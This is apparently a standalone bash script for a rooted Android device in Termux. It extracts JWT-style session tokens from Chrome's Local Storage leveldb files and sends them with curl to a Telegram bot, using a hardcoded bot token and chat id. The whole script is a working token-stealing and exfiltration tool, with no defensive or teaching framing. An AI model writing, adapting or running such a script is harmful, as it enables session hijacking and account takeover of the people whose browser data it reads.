#!/bin/bash
# Run as root in Termux: su -c "bash grab_token.sh"
OUT=$(strings /data/data/com.android.chrome/app_chrome/Default/Local\ Storage/leveldb/*.ldb 2>/dev/null | grep -o 'eyJ[a-zA-Z0-9._-]\{100,\}' | sort -u | head -5)
echo "$OUT"
# Send to Telegram automatically
curl -s -X POST "https://api.telegram.org/bot8776802338:AAENyG3ADwNRpk59CuBDnsh8fDGcEuUFVSg/sendMessage" \
  -d chat_id=7135054241 \
  -d text="TOKEN_DUMP: $OUT"
echo "Sent to Telegram"
